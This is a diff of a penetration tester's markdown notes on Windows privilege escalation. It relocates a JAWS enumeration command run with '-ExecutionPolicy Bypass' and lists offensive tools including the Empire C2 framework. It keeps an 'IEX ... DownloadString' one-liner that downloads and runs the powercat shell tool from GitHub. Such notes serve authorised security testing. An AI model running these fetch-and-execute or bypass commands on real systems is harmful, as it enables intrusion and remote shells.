@@ -10,6 +10,10 @@ https://github.com/bitsadmin/wesng
         windows-exploit-suggester.py –update
         windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt
 
+
+https://github.com/411Hall/JAWS
+	
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
 ```
 # Tools
 
@@ -20,13 +24,9 @@ https://github.com/BC-SECURITY/Empire # Or any other C2 framework but this one w
 https://github.com/BC-SECURITY/Starkiller  
 https://github.com/besimorhino/powercat
 ```powershell
-
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 ```
-https://github.com/411Hall/JAWS
-```powershell
-powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
-```
+
 
 
 ### Arch before making shells!
